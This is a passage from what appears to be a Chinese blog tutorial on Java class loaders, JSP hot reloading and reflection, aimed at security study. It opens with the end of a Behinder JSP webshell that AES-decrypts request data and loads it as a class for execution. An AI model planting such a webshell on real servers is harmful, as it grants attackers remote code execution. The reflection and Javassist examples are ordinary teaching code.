class="string">&quot;AES&quot;</span>);</span><br><span class="line">        c.init(<span class="number">2</span>, <span class="keyword">new</span> <span class="title class_">SecretKeySpec</span>(k.getBytes(), <span class="string">&quot;AES&quot;</span>));</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">U</span>(<span class="built_in">this</span>.getClass().getClassLoader()).g(c.doFinal(<span class="keyword">new</span> <span class="title class_">sun</span>.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()))).newInstance().equals(pageContext);</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure>

<p><strong>冰蝎命令执行类反编译：</strong></p>
<img src="/image/image-20230704154928197.png" alt="image-20230704154928197" style="zoom:80%;" />

<h3 id="JSP类加载"><a href="#JSP类加载" class="headerlink" title="JSP类加载"></a>JSP类加载</h3><p>JSP是JavaEE中的一种常用的脚本文件，可以在JSP中调用Java代码，实际上经过编译后的jsp就是一个Servlet文件，JSP和PHP一样可以实时修改。</p>
<p>众所周知，Java的类是不允许动态修改的（这里特指新增类方法或成员变量），之所以JSP具备热更新的能力，实际上借助的就是自定义类加载行为，当Servlet容器发现JSP文件发生了修改后就会创建一个新的类加载器来替代原类加载器，而被替代后的类加载器所加载的文件并不会立即释放，而是需要等待GC。</p>
<p><strong>模拟jsp文件动态加载程序</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.y5neko.sec.classloader;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> javassist.CtClass;</span><br><span class="line"><span class="keyword">import</span> javassist.CtMethod;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.File;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Modifier;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestJSPClassLoader</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 缓存JSP文件和类加载，刚jsp文件修改后直接替换类加载器实现JSP类字节码热加载</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> Map&lt;File, JSPClassLoader&gt; jspClassLoaderMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;File, JSPClassLoader&gt;();</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 创建用于测试的test.jsp类字节码，类代码如下：</span></span><br><span class="line"><span class="comment">     * &lt;pre&gt;</span></span><br><span class="line"><span class="comment">     * package com.y5neko.sec.classloader;</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * public class test_jsp &#123;</span></span><br><span class="line"><span class="comment">     *     public void _jspService() &#123;</span></span><br><span class="line"><span class="comment">     *         System.out.println(&quot;Hello...&quot;);</span></span><br><span class="line"><span class="comment">     *     &#125;</span></span><br><span class="line"><span class="comment">     * &#125;</span></span><br><span class="line"><span class="comment">     * &lt;/pre&gt;</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> className 类名</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> content   用于测试的输出内容，如：Hello...</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> test_java类字节码</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@throws</span> Exception 创建异常</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">byte</span>[] createTestJSPClass(String className, String content) <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">// 使用Javassist创建类字节码</span></span><br><span class="line">        <span class="type">ClassPool</span> <span class="variable">classPool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 创建一个类，如：com.y5neko.sec.classloader.test_jsp</span></span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">ctServletClass</span> <span class="operator">=</span> classPool.makeClass(className);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 创建_jspService方法</span></span><br><span class="line">        <span class="type">CtMethod</span> <span class="variable">ctMethod</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">CtMethod</span>(CtClass.voidType, <span class="string">&quot;_jspService&quot;</span>, <span class="keyword">new</span> <span class="title class_">CtClass</span>[]&#123;&#125;, ctServletClass);</span><br><span class="line">        ctMethod.setModifiers(Modifier.PUBLIC);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 写入hello方法代码</span></span><br><span class="line">        ctMethod.setBody(<span class="string">&quot;System.out.println(\&quot;&quot;</span> + content + <span class="string">&quot;\&quot;);&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 将hello方法添加到类中</span></span><br><span class="line">        ctServletClass.addMethod(ctMethod);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 生成类字节码</span></span><br><span class="line">        <span class="type">byte</span>[] bytes = ctServletClass.toBytecode();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 释放资源</span></span><br><span class="line">        ctServletClass.detach();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> bytes;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 检测jsp文件是否改变，如果发生了修改就重新编译jsp并更新该jsp类字节码</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> jspFile   JSP文件对象，因为是模拟的jsp文件所以这个文件不需要存在</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> className 类名</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> bytes     类字节码</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> parent    JSP的父类加载</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> JSPClassLoader <span class="title function_">getJSPFileClassLoader</span><span class="params">(File jspFile, String className, <span class="type">byte</span>[] bytes, ClassLoader parent)</span> &#123;</span><br><span class="line">        <span class="type">JSPClassLoader</span> <span class="variable">jspClassLoader</span> <span class="operator">=</span> <span class="built_in">this</span>.jspClassLoaderMap.get(jspFile);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 模拟第一次访问test.jsp时jspClassLoader是空的，因此需要创建</span></span><br><span class="line">        <span class="keyword">if</span> (jspClassLoader == <span class="literal">null</span>) &#123;</span><br><span class="line">            jspClassLoader = <span class="keyword">new</span> <span class="title class_">JSPClassLoader</span>(parent);</span><br><span class="line">            jspClassLoader.createClass(className, bytes);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 缓存JSP文件和所使用的类加载器</span></span><br><span class="line">            <span class="built_in">this</span>.jspClassLoaderMap.put(jspFile, jspClassLoader);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> jspClassLoader;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 模拟第二次访问test.jsp，这个时候内容发生了修改，这里实际上应该检测文件的最后修改时间是否相当，</span></span><br><span class="line">        <span class="comment">// 而不是检测是否是0，因为当jspFile不存在的时候返回值是0，所以这里假设0表示这个文件被修改了，</span></span><br><span class="line">        <span class="comment">// 那么需要热加载该类字节码到类加载器。</span></span><br><span class="line">        <span class="keyword">if</span> (jspFile.lastModified() == <span class="number">0</span>) &#123;</span><br><span class="line">            jspClassLoader = <span class="keyword">new</span> <span class="title class_">JSPClassLoader</span>(parent);</span><br><span class="line">            jspClassLoader.createClass(className, bytes);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 缓存JSP文件和所使用的类加载器</span></span><br><span class="line">            <span class="built_in">this</span>.jspClassLoaderMap.put(jspFile, jspClassLoader);</span><br><span class="line">            <span class="keyword">return</span> jspClassLoader;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 使用动态的类加载器调用test_jsp#_jspService方法</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> jspFile   JSP文件对象，因为是模拟的jsp文件所以这个文件不需要存在</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> className 类名</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> bytes     类字节码</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> parent    JSP的父类加载</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">invokeJSPServiceMethod</span><span class="params">(File jspFile, String className, <span class="type">byte</span>[] bytes, ClassLoader parent)</span> &#123;</span><br><span class="line">        <span class="type">JSPClassLoader</span> <span class="variable">jspClassLoader</span> <span class="operator">=</span> getJSPFileClassLoader(jspFile, className, bytes, parent);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">// 加载com.y5neko.sec.classloader.test_jsp类</span></span><br><span class="line">            Class&lt;?&gt; jspClass = jspClassLoader.loadClass(className);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 创建test_jsp类实例</span></span><br><span class="line">            <span class="type">Object</span> <span class="variable">jspInstance</span> <span class="operator">=</span> jspClass.newInstance();</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 获取test_jsp#_jspService方法</span></span><br><span class="line">            <span class="type">Method</span> <span class="variable">jspServiceMethod</span> <span class="operator">=</span> jspClass.getMethod(<span class="string">&quot;_jspService&quot;</span>);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 调用_jspService方法</span></span><br><span class="line">            jspServiceMethod.invoke(jspInstance);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">TestJSPClassLoader</span> <span class="variable">test</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TestJSPClassLoader</span>();</span><br><span class="line"></span><br><span class="line">        <span class="type">String</span>      <span class="variable">className</span>   <span class="operator">=</span> <span class="string">&quot;com.y5neko.sec.classloader.test_jsp&quot;</span>;</span><br><span class="line">        <span class="type">File</span>        <span class="variable">jspFile</span>     <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(<span class="string">&quot;/data/test.jsp&quot;</span>);</span><br><span class="line">        <span class="type">ClassLoader</span> <span class="variable">classLoader</span> <span class="operator">=</span> ClassLoader.getSystemClassLoader();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 模拟第一次访问test.jsp文件自动生成test_jsp.java</span></span><br><span class="line">        <span class="type">byte</span>[] testJSPClass01 = createTestJSPClass(className, <span class="string">&quot;Hello y5neko!&quot;</span>);</span><br><span class="line"></span><br><span class="line">        test.invokeJSPServiceMethod(jspFile, className, testJSPClass01, classLoader);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 模拟修改了test.jsp文件，热加载修改后的test_jsp.class</span></span><br><span class="line">        <span class="type">byte</span>[] testJSPClass02 = createTestJSPClass(className, <span class="string">&quot;Hello Y5neKO!&quot;</span>);</span><br><span class="line">        test.invokeJSPServiceMethod(jspFile, className, testJSPClass02, classLoader);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * JSP类加载器</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">JSPClassLoader</span> <span class="keyword">extends</span> <span class="title class_">ClassLoader</span> &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="title function_">JSPClassLoader</span><span class="params">(ClassLoader parent)</span> &#123;</span><br><span class="line">            <span class="built_in">super</span>(parent);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/**</span></span><br><span class="line"><span class="comment">         * 创建类</span></span><br><span class="line"><span class="comment">         *</span></span><br><span class="line"><span class="comment">         * <span class="doctag">@param</span> className 类名</span></span><br><span class="line"><span class="comment">         * <span class="doctag">@param</span> bytes     类字节码</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">createClass</span><span class="params">(String className, <span class="type">byte</span>[] bytes)</span> &#123;</span><br><span class="line">            defineClass(className, bytes, <span class="number">0</span>, bytes.length);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>该示例程序通过Javassist动态生成了两个不同的<code>com.y5neko.sec.classloader.test_jsp</code>类字节码，模拟JSP文件修改后的类加载，核心原理就是<strong>检测到JSP文件修改后动态替换类加载器</strong>，从而实现JSP热加载，具体的处理逻辑如下（第3和第4部未实现，使用了Javassist动态创建）：</p>
<ol>
<li>模拟客户端第一次访问test.jsp；</li>
<li>检测是否已缓存了test.jsp的类加载；</li>
<li><del>Servlet容器找到test.jsp文件并编译成test_jsp.java</del>；</li>
<li><del>编译成test_jsp.class文件</del>；</li>
<li>创建test.jsp文件专用的类加载器<code>jspClassLoader</code>，并缓存到<code>jspClassLoaderMap</code>对象中；</li>
<li><code>jspClassLoader</code>加载test_jsp.class字节码并创建<code>com.y5neko.sec.classloader.test_jsp</code>类；</li>
<li><code>jspClassLoader</code>调用<code>com.y5neko.sec.classloader.test_jsp</code>类的<code>_jspService</code>方法；</li>
<li>输出<code>Hello y5neko!</code>；</li>
<li>模拟客户端第二次访问test.jsp；</li>
<li>假设test.jsp文件发生了修改，重新编译test.jsp并创建一个新的类加载器<code>jspClassLoader</code>加载新的类字节码；</li>
<li>使用新创建的<code>jspClassLoader</code>类加载器调用<code>com.y5neko.sec.classloader.test_jsp</code>类的<code>_jspService</code>方法；</li>
<li>输出<code>Hello Y5neKO</code>；</li>
</ol>
<h2 id="Java反射机制"><a href="#Java反射机制" class="headerlink" title="Java反射机制"></a>Java反射机制</h2><p>Java反射(<code>Reflection</code>)是Java非常重要的动态特性，通过使用反射我们不仅可以获取到任何类的成员方法(<code>Methods</code>)、成员变量(<code>Fields</code>)、构造方法(<code>Constructors</code>)等信息，还可以动态创建Java类实例、调用任意的类方法、修改任意的类成员变量值等。Java反射机制是Java语言的动态性的重要体现，也是Java的各种框架底层实现的灵魂。</p>
<blockquote>
<p>Java 的<strong>反射机制</strong>是指在运行状态中，对于任意一个类都能够知道这个类所有的属性和方法； 并且对于任意一个对象，都能够调用它的任意一个方法；这种动态获取信息以及动态调用对象方法的功能成为Java语言的反射机制。</p>
<p>而我们之前在上面介绍的运用new关键字去实例化类的过程就叫做<strong>正射</strong>。那么假如，我是说如果我们一开始并不知道我们要初始化的类对象是什么，那么阁下该如何应对呢?</p>
<p>所以总的来说，就是当我在程序运行前并不知道我们要实例什么类的时候，我们就需要运用反射，通过反射我们可以获取这个类的原型，然后为所欲为。</p>
</blockquote>
<h3 id="获取Class对象"><a href="#获取Class对象" class="headerlink" title="获取Class对象"></a>获取Class对象</h3><p>Java反射操作的是<code>java.lang.Class</code>对象，所以我们需要先想办法获取到Class对象，通常我们有如下几种方式获取一个类的Class对象：</p>
<ol>
<li><code>类名.class</code>，如:<code>com.y5neko.sec.classloader.TestHelloWorld.class</code>。</li>
<li><code>Class.forName(&quot;com.y5neko.sec.classloader.TestHelloWorld&quot;)</code>。</li>
<li><code>classLoader.loadClass(&quot;com.y5neko.sec.classloader.TestHelloWorld&quot;);</code></li>
</ol>
<h4 id="获取Runtime类Class对象代码片段"><a href="#获取Runtime类Class对象代码片段" class="headerlink" title="获取Runtime类Class对象代码片段"></a><strong>获取Runtime类Class对象代码片段</strong></h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">className</span>     <span class="operator">=</span> <span class="string">&quot;java.lang.Runtime&quot;</span>;</span><br><span class="line"><span class="type">Class</span>  <span class="variable">runtimeClass1</span> <span class="operator">=</span> Class.forName(className);</span><br><span class="line"><span class="type">Class</span>  <span class="variable">runtimeClass2</span> <span class="operator">=</span> java.lang.Runtime.class;</span><br><span class="line"><span class="type">Class</span>  <span class="variable">runtimeClass3</span> <span class="operator">=</span> ClassLoader.getSystemClassLoader().loadClass(className);</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//1.使用class.forName()方法</span></span><br><span class="line">Class p=Class.forName(<span class="string">&quot;test.phone&quot;</span>); <span class="comment">//里面要填:类所在的包名+类名</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//2.使用实例化对象的getClass()方法</span></span><br><span class="line">phone p=<span class="keyword">new</span> <span class="title class_">phone</span>(); <span class="comment">//实例化对象</span></span><br><span class="line">Class p1=p.getClass();<span class="comment">//通过实例化对象来获取完整类的原型</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//3.使用类的class方法</span></span><br><span class="line">Class p=phone.class;</span><br></pre></td></tr></table></figure>

<h3 id="获取实例化对象-object"><a href="#获取实例化对象-object" class="headerlink" title="获取实例化对象(object)"></a><strong>获取实例化对象(object)</strong></h3><p>获取实例化对象object的方法通常有两种:</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//1.通过class的newInstance()方法</span></span><br><span class="line"><span class="type">Class</span> <span class="variable">p</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;test.phone&quot;</span>);</span><br><span class="line"><span class="type">Object</span> <span class="variable">p1</span> <span class="operator">=</span> p.newInstance();</span><br><span class="line"><span class="comment">//这里也有另一种写法,区别是要进行强制类型转化</span></span><br><span class="line"><span class="type">Class</span> <span class="variable">p</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;test.phone&quot;</span>);</span><br><span class="line"><span class="type">phone</span> <span class="variable">p1</span> <span class="operator">=</span> (phone)p.newInstance();</span><br><span class="line"></span><br><span class="line"><span class="comment">//2.通过constructor的newInstance()方法</span></span><br><span class="line">Class p=Class.forName(<span class="string">&quot;test.phone&quot;</span>);</span><br><span class="line">Constructor constructor=p.getConstructor();</span><br><span class="line">Object p1=constructor.newInstance();<span class="comment">//这里同上一样有另一种写法，就不再赘述</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//运用这种方法前需要先调用它的无参构造器，然后再实例化</span></span><br></pre></td></tr></table></figure>



<p>下面用一个实例来演示一下反射获取类和对象</p>
<h4 id="phone类"><a href="#phone类" class="headerlink" title="phone类"></a><strong>phone类</strong></h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.y5neko.sec.phone;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">phone</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">double</span> weight;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">phone</span><span class="params">()</span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">phone</span><span class="params">(String name,<span class="type">double</span> weight)</span>&#123;</span><br><span class="line">        <span class="built_in">this</span>.name=name;</span><br><span class="line">        <span class="built_in">this</span>.weight=weight;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">dianyuan</span><span class="params">()</span>&#123; <span class="comment">//定义一个无返回值的方法，调用会打印&quot;开机&quot;</span></span><br><span class="line">        System.out.println(<span class="string">&quot;开机&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setName</span><span class="params">(String name)</span>&#123; <span class="comment">//定义一个形参为String类型的方法，调用后给name属性赋值</span></span><br><span class="line">        <span class="built_in">this</span>.name=name;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getName</span><span class="params">()</span>&#123; <span class="comment">//定义一个调用后返回name属性的值的方法</span></span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setWeight</span><span class="params">(<span class="type">double</span> weight)</span>&#123; <span class="comment">//定义一个形参为double类型的方法，调用后给weight属性赋值</span></span><br><span class="line">        <span class="built_in">this</span>.weight=weight;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">double</span> <span class="title function_">getWeight</span><span class="params">()</span>&#123; <span class="comment">//定义一个调用后返回weight属性的值的方法</span></span><br><span class="line">        <span class="keyword">return</span> weight;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="反射获取示例"><a href="#反射获取示例" class="headerlink" title="反射获取示例"></a><strong>反射获取示例</strong></h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.y5neko.sec.reflect;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationTargetException;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestReflectClass</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> ClassNotFoundException, InstantiationException, IllegalAccessException, NoSuchMethodException, InvocationTargetException &#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//通过class的newInstance()方法</span></span><br><span class="line">        <span class="type">Class</span> <span class="variable">p</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;com.y5neko.sec.phone.phone&quot;</span>);</span><br><span class="line">        System.out.println(p);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">p1</span> <span class="operator">=</span> p.newInstance();</span><br><span class="line">        System.out.println(<span class="string">&quot;class的newInstance方法：\n&quot;</span> + p1);</span><br><span class="line">        <span class="comment">//反射调用方法</span></span><br><span class="line">        <span class="type">Method</span> <span class="variable">method1</span> <span class="operator">=</span> p.getDeclaredMethod(<span class="string">&quot;setName&quot;</span>, String.class);</span><br><span class="line">        <span class="type">Method</span> <span class="variable">method2</span> <span class="operator">=</span> p.getDeclaredMethod(<span class="string">&quot;getName&quot;</span>);</span><br><span class="line">        method1.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        method1.invoke(p1,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;IQOO&quot;</span>&#125;);</span><br><span class="line">        System.out.println(method2.invoke(p1));</span><br><span class="line"></span><br><span class="line">        <span class="comment">//另一种写法,区别是要进行强制类型转化</span></span><br><span class="line">        <span class="type">Class</span> <span class="variable">p_2</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;com.y5neko.sec.phone.phone&quot;</span>);</span><br><span class="line">        <span class="type">phone</span> <span class="variable">p2</span> <span class="operator">=</span> (phone)p_2.newInstance();</span><br><span class="line">        System.out.println(<span class="string">&quot;class的第二个newInstance方法：\n&quot;</span> + p2);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//通过constructor的newInstance()方法</span></span><br><span class="line">        <span class="type">Class</span> <span class="variable">p_3</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;com.y5neko.sec.phone.phone&quot;</span>);</span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">constructor</span> <span class="operator">=</span> p_3.getConstructor(String.class, <span class="type">double</span>.class);</span><br><span class="line">        System.out.println(<span class="string">&quot;constructor的newInstance方法：&quot;</span>);</span><br><span class="line">        System.out.println(constructor);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">p3</span> <span class="operator">=</span> constructor.newInstance(<span class="string">&quot;IQOO&quot;</span>,<span class="number">12.5</span>);</span><br><span class="line">        System.out.println(p3);</span><br><span class="line"></span><br><span class="line">        <span class="type">phone</span> <span class="variable">pp</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">phone</span>();</span><br><span class="line">        System.out.println(pp);</span><br><span class="line">        pp.setName(<span class="string">&quot;123&quot;</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<img src="/image/image-20230705202852694.png" alt="image-20230705202852694" style="zoom:80%;" />

<p>class的newInstance()方法,需要我们类中存在无参的构造器，它通过无参的构造器来实例化，而一旦我们类中不存在无参构造器，那么第一种方法就不行了</p>
<p>我们可以用constructor的newInstance方法来直接通过有参构造器初始化：</p>
<h4 id="constructor的newInstance方法"><a href="#constructor的newInstance方法" class="headerlink" title="constructor的newInstance方法"></a>constructor的newInstance方法</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//通过constructor的newInstance()方法</span></span><br><span class="line"><span class="type">Class</span> <span class="variable">p_3</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;com.y5neko.sec.phone.phone&quot;</span>);</span><br><span class="line"><span class="comment">//这个是调用了我们之前设置的含参构造器(忘记的上去看看第一部分构造的),后面传入的参数是String和double的原型类，因为我们之前构造器的参数类型就是String和double，所以我们这里用这个。</span></span><br><span class="line"><span class="type">Constructor</span> <span class="variable">constructor</span> <span class="operator">=</span> p_3.getConstructor(String.class, <span class="type">double</span>.class);</span><br><span class="line"><span class="type">Object</span> <span class="variable">p3</span> <span class="operator">=</span> constructor.newInstance(<span class="string">&quot;IQOO&quot;</span>,<span class="number">12.5</span>);</span><br></pre></td></tr></table></figure>

<p><img src="/image/image-20230705210032713.png" alt="image-20230705210032713"></p>
<h3 id="获取类的构造器-constructor"><a href="#获取类的构造器-constructor" class="headerlink" title="获取类的构造器(constructor)"></a>获取类的构造器(constructor)</h3><p>获取类的构造器constructor一般有四种方法:</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//1.获取public类型的构造器:getConstructor(class[]parameterTypes)</span></span><br><span class="line">Class p=Class.forName(<span class="string">&quot;test.phone&quot;</span>);</span><br><span class="line">Constructor constructor=p.getConstructor();</span><br><span class="line"><span class="comment">//这里你可以指定参数，来获取含参的构造器，之前演示过，不再赘述.</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//2.获取全部public类型的构造器:getConstructors()</span></span><br><span class="line">Class p=Class.forName(<span class="string">&quot;test.phone&quot;</span>);</span><br><span class="line">Constructor[] constructor=p.getConstructors();</span><br><span class="line"><span class="comment">//注意这里要用数组，因为全部构造器可能并不只有一个</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//3.获取public和private类型的构造器:getDeclaredConstructor(class[]parameterTypes)</span></span><br><span class="line"><span class="comment">//当我们前面构造器类型是private的时候，运用上述两种方法是调用不到的。</span></span><br><span class="line">Class p=Class.forName(<span class="string">&quot;test.phone&quot;</span>);</span><br><span class="line">Constructor constructor=p.getDeclaredConstructor();</span><br><span class="line"></span><br><span class="line"><span class="comment">//4.获取全部类型的构造器:getDeclaredConstructors()</span></span><br><span class="line">Class p=Class.forName(<span class="string">&quot;test.phone&quot;</span>);</span><br><span class="line">Constructor[] constructor=p.getDeclaredConstructors();</span><br><span class="line"><span class="comment">//注意，这个同意要改为数组的形式</span></span><br></pre></td></tr></table></figure>

<h4 id="获取构造器实例"><a href="#获取构造器实例" class="headerlink" title="获取构造器实例"></a>获取构造器实例</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.y5neko.sec.reflect;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestReflectConstructor</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> ClassNotFoundException, NoSuchMethodException &#123;</span><br><span class="line">        Class p=Class.forName(<span class="string">&quot;com.y5neko.sec.phone.phone&quot;</span>);</span><br><span class="line"></span><br><span class="line">        Constructor constructor=p.getConstructor(String.class, <span class="type">double</span>.class);</span><br><span class="line">        System.out.println(<span class="string">&quot;public类型的构造器：&quot;</span>);</span><br><span class="line">        System.out.println(constructor);</span><br><span class="line"></span><br><span class="line">        Constructor[] constructors = p.getConstructors();</span><br><span class="line">        System.out.println(<span class="string">&quot;全部public类型的构造器：&quot;</span>);</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; constructors.length; i++) &#123;</span><br><span class="line">            System.out.println(constructors[i]);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">constructor1</span> <span class="operator">=</span> p.getDeclaredConstructor();</span><br><span class="line">        System.out.println(<span class="string">&quot;private和public类型的构造器：&quot;</span>);</span><br><span class="line">        System.out.println(constructor1);</span><br><span class="line"></span><br><span class="line">        Constructor[] constructors1 = 